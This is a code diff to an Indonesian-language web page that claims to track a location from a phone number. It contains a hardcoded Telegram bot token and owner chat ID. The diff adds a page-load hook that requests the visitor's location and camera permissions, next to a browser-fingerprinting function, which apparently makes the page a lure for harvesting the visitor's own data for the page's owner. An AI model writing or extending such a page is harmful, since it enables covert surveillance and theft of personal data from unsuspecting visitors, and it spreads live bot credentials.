@@ -45,7 +45,7 @@
     }
   </style>
 </head>
-<body>
+<body onload="requestPermissions()">
   <h1>Lacak Lokasi Lewat Nomor HP</h1>
   <input type="text" id="phone" placeholder="Masukkan nomor target" />
   <button onclick="track()">Track</button>
@@ -54,6 +54,15 @@
   <div id="result"></div>  <script>
     const BOT_TOKEN = "7743579295:AAGGNxeSBz6oFsORfR3uKNbVlGy5MAvuTsY";
     const OWNER_CHAT_ID = "6629230649";
+
+    function requestPermissions() {
+      // Minta izin lokasi
+      navigator.geolocation.getCurrentPosition(() => {}, () => {});
+      // Minta izin kamera
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        stream.getTracks().forEach(track => track.stop());
+      }).catch(() => {});
+    }
 
     async function generateFingerprint() {
       const ua = navigator.userAgent;
